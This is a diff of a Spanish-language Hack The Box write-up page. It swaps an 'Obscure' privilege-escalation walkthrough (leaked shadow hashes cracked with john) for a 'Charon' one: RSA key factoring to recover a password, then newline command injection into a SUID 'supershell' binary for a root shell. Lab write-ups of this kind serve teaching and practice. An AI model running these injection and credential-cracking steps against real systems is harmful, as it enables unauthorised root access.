+</code></pre></div></div>
+
+<p>Por lo tanto, nuestro programa en python sería el siguiente:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding:utf-8
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="s">"decoder.pub"</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span>
+<span class="n">n</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="c1"># Con factordb.com se puede obtener p y q ya que n es un número relativamente pequeño
+</span><span class="n">p</span> <span class="o">=</span> <span class="mi">280651103481631199181053614640888768819</span>
+<span class="n">q</span> <span class="o">=</span> <span class="mi">303441468941236417171803802700358403049</span>
+
+<span class="n">m</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># Modular multiplicative inverse function in Python
+</span><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'modular inverse does not exist'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+
+<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
+
+<span class="c1"># Se muestran los valores
+</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de e = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de n = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de p = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de q = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">q</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de m = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">m</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de d = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">d</span><span class="p">)</span>
+
+<span class="c1"># Se genera la llave privada
+</span><span class="n">priv_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"La clave privada es:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">priv_key</span><span class="o">.</span><span class="n">exportKey</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"private.key"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">priv_key</span><span class="o">.</span><span class="n">exportKey</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1"># Se descifra el archivo pass.crypt
+</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"openssl rsautl -decrypt -inkey private.key -in pass.crypt -out pass.decrypted"</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Tenemos ahora la contraseña <code class="language-plaintext highlighter-rouge">nevermindthebollocks</code>, la cual podría ser del usuario <strong>decoder</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home<span class="nv">$ </span>su decoder
 Password: 
-robert@obscure:~<span class="nv">$ </span><span class="nb">whoami
-</span>robert
-robert@obscure:~<span class="err">$</span>
+decoder@charon:/home<span class="nv">$ </span><span class="nb">whoami
+</span>decoder
+decoder@charon:/home<span class="err">$</span>
 </code></pre></div></div>
 
-<p>Ya somos el usuario <code class="language-plaintext highlighter-rouge">robert</code> y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en el usuario <strong>root</strong>.</p>
+<p>Ya somos el usuario <strong>decoder</strong> y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en usuario <strong>root</strong>; por lo que vamos a enumerar un poco el sistema.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@obscure:~<span class="nv">$ </span><span class="nb">id
-</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
-robert@obscure:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
-Matching Defaults entries <span class="k">for </span>robert on obscure:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User robert may run the following commands on obscure:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-robert@obscure:~<span class="err">$</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:/home<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>decoder<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>freeeze<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>freeeze<span class="o">)</span>
+decoder@charon:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>decoder: 
+Sorry, user decoder may not run <span class="nb">sudo </span>on charon.
+decoder@charon:/home<span class="nv">$ </span><span class="nb">cd</span> /
+decoder@charon:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
+./usr/local/bin/supershell
+./usr/lib/openssh/ssh-keysign
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/snapd/snap-confine
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/eject/dmcrypt-get-device
+./usr/bin/pkexec
+./usr/bin/sudo
+./usr/bin/chfn
+./usr/bin/newgrp
+./usr/bin/gpasswd
+./usr/bin/chsh
+./usr/bin/passwd
+./usr/bin/at
+./usr/bin/newgidmap
+./usr/bin/newuidmap
+./bin/ntfs-3g
+./bin/ping6
+./bin/mount
+./bin/fusermount
+./bin/umount
+./bin/ping
+./bin/su
+decoder@charon:/<span class="err">$</span>
 </code></pre></div></div>
 
-<p>Vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code> como el usuario propietario (<strong>root</strong>) sin proporcionar contraseña; así que vamos a echarle un ojo.</p>
+<p>Vemos un archivo curioso <code class="language-plaintext highlighter-rouge">/usr/local/bin/supershell</code>, asi que vamos a echarle un ojo ya que tenemos permisos SUID.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@obscure:~/BetterSSH<span class="nv">$ </span><span class="nb">cat </span>BetterSSH.py 
-import sys                     
-import random, string
-import os                                                                                                                        
-import <span class="nb">time                                                     
-</span>import crypt                 
-import traceback  
-import subprocess
-                                
-path <span class="o">=</span> <span class="s1">''</span>.join<span class="o">(</span>random.choices<span class="o">(</span>string.ascii_letters + string.digits, <span class="nv">k</span><span class="o">=</span>8<span class="o">))</span>
-session <span class="o">=</span> <span class="o">{</span><span class="s2">"user"</span>: <span class="s2">""</span>, <span class="s2">"authenticated"</span>: 0<span class="o">}</span>
-try:                                                            
-    session[<span class="s1">'user'</span><span class="o">]</span> <span class="o">=</span> input<span class="o">(</span><span class="s2">"Enter username: "</span><span class="o">)</span>
-    passW <span class="o">=</span> input<span class="o">(</span><span class="s2">"Enter password: "</span><span class="o">)</span>
-                                
-    with open<span class="o">(</span><span class="s1">'/etc/shadow'</span>, <span class="s1">'r'</span><span class="o">)</span> as f:
-        data <span class="o">=</span> f.readlines<span class="o">()</span>                                    
-    data <span class="o">=</span> <span class="o">[(</span>p.split<span class="o">(</span><span class="s2">":"</span><span class="o">)</span> <span class="k">if</span> <span class="s2">"$"</span> <span class="k">in </span>p <span class="k">else </span>None<span class="o">)</span> <span class="k">for </span>p <span class="k">in </span>data]
-    passwords <span class="o">=</span> <span class="o">[]</span>       
-    <span class="k">for </span>x <span class="k">in </span>data:            
-        <span class="k">if </span>not x <span class="o">==</span> None:
-            passwords.append<span class="o">(</span>x<span class="o">)</span>                                 
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/supershell
+<span class="nt">-rwsr-x---</span> 1 root freeeze 9120 Jun 24  2017 /usr/local/bin/supershell
+decoder@charon:/<span class="nv">$ </span>/usr/local/bin/supershell
+Supershell <span class="o">(</span>very beta<span class="o">)</span>
+usage: supershell &lt;cmd&gt;
+decoder@charon:/<span class="nv">$ </span>/usr/local/bin/supershell <span class="nb">whoami
+</span>Supershell <span class="o">(</span>very beta<span class="o">)</span>
+decoder@charon:/<span class="nv">$ </span>strings /usr/local/bin/supershell             
+/lib64/ld-linux-x86-64.so.2
+tq<span class="nv">$t</span>                       
+libc.so.6            
+setuid             
+<span class="nb">exit                
+</span>strncmp             
+strncpy                       
+puts              
+__stack_chk_fail
+<span class="nb">printf
+</span>strlen
+strcspn
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.4
+GLIBC_2.2.5
+%<span class="s2">"       
+AWAVA
+AUATL
+[]A</span><span class="se">\A</span><span class="s2">]A^A_
+|</span><span class="sb">`</span>&amp;&gt;&lt;<span class="s1">'"\[]{};#
+Supershell (very beta)
+usage: supershell &lt;cmd&gt;
+/bin/ls
+++[%s]
+;*3$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7585
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strncpy@@GLIBC_2.2.5
+strncmp@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+strlen@@GLIBC_2.2.5
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+tonto_chi_legge
+strcspn@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+_Jv_RegisterClasses
+exit@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+decoder@charon:/$
+</span></code></pre></div></div>
 
-    passwordFile <span class="o">=</span> <span class="s1">'\n'</span>.join<span class="o">([</span><span class="s1">'\n'</span>.join<span class="o">(</span>p<span class="o">)</span> <span class="k">for </span>p <span class="k">in </span>passwords]<span class="o">)</span>  
-    with open<span class="o">(</span><span class="s1">'/tmp/SSH/'</span>+path, <span class="s1">'w'</span><span class="o">)</span> as f:
-        f.write<span class="o">(</span>passwordFile<span class="o">)</span>                                   
-    time.sleep<span class="o">(</span>.1<span class="o">)</span>
-    salt <span class="o">=</span> <span class="s2">""</span>                  
-    realPass <span class="o">=</span> <span class="s2">""</span>                                               
-    <span class="k">for </span>p <span class="k">in </span>passwords:
-        <span class="k">if </span>p[0] <span class="o">==</span> session[<span class="s1">'user'</span><span class="o">]</span>:          
-            salt, realPass <span class="o">=</span> p[1].split<span class="o">(</span><span class="s1">'$'</span><span class="o">)[</span>2:]
-            <span class="nb">break        
-                                
-    </span><span class="k">if </span>salt <span class="o">==</span> <span class="s2">""</span>:
-        print<span class="o">(</span><span class="s2">"Invalid user"</span><span class="o">)</span>                                   
-        os.remove<span class="o">(</span><span class="s1">'/tmp/SSH/'</span>+path<span class="o">)</span>
-        sys.exit<span class="o">(</span>0<span class="o">)</span>                                             
-    salt <span class="o">=</span> <span class="s1">'$6$'</span>+salt+<span class="s1">'$'</span>                                       
-    realPass <span class="o">=</span> salt + realPass                                  
-                                                                                                                                 
-    <span class="nb">hash</span> <span class="o">=</span> crypt.crypt<span class="o">(</span>passW, salt<span class="o">)</span>
-    <span class="k">if </span><span class="nb">hash</span> <span class="o">==</span> realPass:
-        print<span class="o">(</span><span class="s2">"Authed!"</span><span class="o">)</span>
-        session[<span class="s1">'authenticated'</span><span class="o">]</span> <span class="o">=</span> 1
-    <span class="k">else</span>:
-        print<span class="o">(</span><span class="s2">"Incorrect pass"</span><span class="o">)</span>
-        os.remove<span class="o">(</span><span class="s1">'/tmp/SSH/'</span>+path<span class="o">)</span>
-        sys.exit<span class="o">(</span>0<span class="o">)</span>
-    os.remove<span class="o">(</span>os.path.join<span class="o">(</span><span class="s1">'/tmp/SSH/'</span>,path<span class="o">))</span>
-except Exception as e:
-    traceback.print_exc<span class="o">()</span>
-    sys.exit<span class="o">(</span>0<span class="o">)</span>
+<p>De las cadenas imprimibles del binario, ya debemos de ver que se hace uso de <code class="language-plaintext highlighter-rouge">/bin/ls</code> de manera absoluta, es decir, no se hace el llamado a la función <code class="language-plaintext highlighter-rouge">ls</code> tal cual, si no que se escribe de forma absoluta su ruta; así que vamos a tratar de ocuparla.</p>
 
-<span class="k">if </span>session[<span class="s1">'authenticated'</span><span class="o">]</span> <span class="o">==</span> 1:
-    <span class="k">while </span>True:
-        <span class="nb">command</span> <span class="o">=</span> input<span class="o">(</span>session[<span class="s1">'user'</span><span class="o">]</span> + <span class="s2">"@Obscure</span><span class="nv">$ </span><span class="s2">"</span><span class="o">)</span>
-        cmd <span class="o">=</span> <span class="o">[</span><span class="s1">'sudo'</span>, <span class="s1">'-u'</span>,  session[<span class="s1">'user'</span><span class="o">]]</span>
-        cmd.extend<span class="o">(</span>command.split<span class="o">(</span><span class="s2">" "</span><span class="o">))</span>
-        proc <span class="o">=</span> subprocess.Popen<span class="o">(</span>cmd, <span class="nv">stdout</span><span class="o">=</span>subprocess.PIPE, <span class="nv">stderr</span><span class="o">=</span>subprocess.PIPE<span class="o">)</span>
-
-        o,e <span class="o">=</span> proc.communicate<span class="o">()</span>
-        print<span class="o">(</span><span class="s1">'Output: '</span> + o.decode<span class="o">(</span><span class="s1">'ascii'</span><span class="o">))</span>
-        print<span class="o">(</span><span class="s1">'Error: '</span>  + e.decode<span class="o">(</span><span class="s1">'ascii'</span><span class="o">))</span> <span class="k">if </span>len<span class="o">(</span>e.decode<span class="o">(</span><span class="s1">'ascii'</span><span class="o">))</span> <span class="o">&gt;</span> 0 <span class="k">else </span>print<span class="o">(</span><span class="s1">''</span><span class="o">)</span>
-robert@obscure:~/BetterSSH<span class="err">$</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:/<span class="nv">$ </span>/usr/local/bin/supershell /bin/ls
+Supershell <span class="o">(</span>very beta<span class="o">)</span>
+++[/bin/ls]
+bin   dev  home        initrd.img.old  lib64    media  opt      root  sbin  srv  tmp  var      vmlinuz.old
+boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
+decoder@charon:/<span class="nv">$ </span>
+decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell /bin/ls<span class="p">;</span><span class="nb">whoami
+</span>Supershell <span class="o">(</span>very beta<span class="o">)</span>
+++[/bin/ls]
+decoder.pub  pass.crypt  user.txt
+decoder
+decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls;whoami"</span>
+Supershell <span class="o">(</span>very beta<span class="o">)</span>
+decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls;</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
+Supershell <span class="o">(</span>very beta<span class="o">)</span>
+decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
+Supershell <span class="o">(</span>very beta<span class="o">)</span>
+++[/bin/lsdecoder]
+sh: 1: /bin/lsdecoder: not found
+decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls</span><span class="nv">$/</span><span class="s2">
+&gt; whoami
+&gt; "</span>
+Supershell <span class="o">(</span>very beta<span class="o">)</span>
+++[/bin/ls<span class="nv">$/</span>
+<span class="nb">whoami</span>
+<span class="o">]</span>
+sh: 1: /bin/ls<span class="nv">$/</span>: not found
+root
+decoder@charon:~<span class="err">$</span>
 </code></pre></div></div>
 
-<p>Analizando un poco al script, vemos que dentro del directorio <code class="language-plaintext highlighter-rouge">/tmp/SSH/</code> se guarda una copia de lo que existe en <code class="language-plaintext highlighter-rouge">/etc/shadow</code> de una forma parseada y a partir de dicha información, valida si el usuario y contraseña que introduzcamos coinciden o no. Además, si las credenciales son incorrectas, los archivos son borrados. Por lo tanto, vamos primero a conectarnos a través de ssh como el usuario <code class="language-plaintext highlighter-rouge">robert</code>:</p>
+<p>Al realizar varias pruebas, ya encontramos una forma de ejecutar comandos como el usuario <strong>root</strong> y lo logramos escapando del contexto con <code class="language-plaintext highlighter-rouge">$/ \n whoami \n "</code> y vemos <strong>root</strong>. Por lo tanto, ahora vamos a lanzarnos una <code class="language-plaintext highlighter-rouge">bash</code>:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh robert@10.10.10.168
-The authenticity of host <span class="s1">'10.10.10.168 (10.10.10.168)'</span> can<span class="s1">'t be established.
-ECDSA key fingerprint is SHA256:H6t3x5IXxyijmFEZ2NVZbIZHWZJZ0d1IDDj3OnABJDw.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '</span>10.10.10.168<span class="s1">' (ECDSA) to the list of known hosts.
-robert@10.10.10.168'</span>s password: 
-Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-65-generic x86_64<span class="o">)</span>
-
- <span class="k">*</span> Documentation:  https://help.ubuntu.com
- <span class="k">*</span> Management:     https://landscape.canonical.com
- <span class="k">*</span> Support:        https://ubuntu.com/advantage
-
-  System information as of Mon Jan 10 02:03:06 UTC 2022
-
-  System load:  0.08              Processes:             112
-  Usage of /:   45.8% of 9.78GB   Users logged <span class="k">in</span>:       0
-  Memory usage: 16%               IP address <span class="k">for </span>ens160: 10.10.10.168
-  Swap usage:   0%
-
-
-40 packages can be updated.
-0 updates are security updates.
-
-
-Last login: Mon Dec  2 10:23:36 2019 from 10.10.14.4
-robert@obscure:~<span class="err">$</span>
-</code></pre></div></div>
-
-<p>En esta sesión, vamos a ejecutar un bucle que nos permita leer todo lo que se encuentre en la ruta <code class="language-plaintext highlighter-rouge">/tmp/SSH</code> y en la sesión que obtuvimos por una reverse shell vamos a ejecutar el comando que se nos indica.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@obscure:~/BetterSSH<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: <span class="nb">test
-</span>Enter password: <span class="nb">test
-</span>Invalid user
-robert@obscure:~/BetterSSH<span class="err">$</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@obscure:/tmp/SSH<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">cat</span> <span class="k">*</span><span class="p">;</span> <span class="k">done </span>2&gt;/dev/null                                                                  
-root                                                                                                                             
-<span class="nv">$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span>                               
-18226                                                                                                                            
-0                                                                                                                                
-99999                                                                                                                            
-7                                                                                                                                
-                                                                                                                                 
-                                                                                                                                 
-                                                                                                                                 
-                                                                                                                                 
-robert                                                                                                                           
-<span class="nv">$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU</span>.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/                               
-18163                                                                                                                            
-0                                                                                                                                
-99999                                                                                                                            
-7 
-</code></pre></div></div>
-
-<p>Ya tenemos el hash del usuario <strong>root</strong>; por lo que vamos a tratar de crackearlo (El archivo <code class="language-plaintext highlighter-rouge">hash</code> contiene el hash del usuario <strong>root</strong> de la máquina víctima).</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
-</span>Using default input encoding: UTF-8
-Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 256/256 AVX2 4x]<span class="o">)</span>
-Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
-Will run 8 OpenMP threads
-Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
-mercedes         <span class="o">(</span>?<span class="o">)</span>
-1g 0:00:00:00 DONE <span class="o">(</span>2022-01-09 20:02<span class="o">)</span> 5.263g/s 5389p/s 5389c/s 5389C/s 123456..bethany
-Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
-Session completed
-</code></pre></div></div>
-
-<p>Ya tenemos la contraseña, por lo tanto podríamos migrar al usuario <strong>root</strong>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@obscure:~/BetterSSH<span class="nv">$ </span>su root
-Password: 
-root@obscure:/home/robert/BetterSSH# <span class="nb">whoami
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls</span><span class="nv">$/</span><span class="s2">
+&gt; bash
+&gt; "</span>
+Supershell <span class="o">(</span>very beta<span class="o">)</span>
+++[/bin/ls<span class="nv">$/</span>
+bash
+<span class="o">]</span>
+sh: 1: /bin/ls<span class="nv">$/</span>: not found
+root@charon:~# <span class="nb">whoami
 </span>root
-root@obscure:/home/robert/BetterSSH#
+root@charon:~#
 </code></pre></div></div>
 
 <p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
@@ -969,11 +1110,19 @@ root@obscure:/home/robert/BetterSSH#
     
       
       
-      <a href="/tags/#cryptography" class="page__taxonomy-item" rel="tag">Cryptography</a><span class="sep">, </span>
+      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
     
       
       
-      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">SQLi</a><span class="sep">, </span>
     
       
       
@@ -998,18 +1147,18 @@ root@obscure:/home/robert/BetterSSH#
     
       
       
-      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+      <a href="/categories/#hard" class="page__taxonomy-item" rel="tag">Hard</a><span class="sep">, </span>
     
       
       
-      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
     
     </span>
   </p>
 
 
         
-          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-09T00:00:00-06:00">January 09, 2022</time></p>
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-11T00:00:00-06:00">January 11, 2022</time></p>
         
       </footer>
 
@@ -1018,7 +1167,7 @@ root@obscure:/home/robert/BetterSSH#
       
   <nav class="pagination">
     
-      <a href="/htb-openadmin/" class="pagination--pager" title="Hack The Box OpenAdmin
+      <a href="/htb-obscurity/" class="pagination--pager" title="Hack The Box Obscurity
 ">Previous</a>
     
     
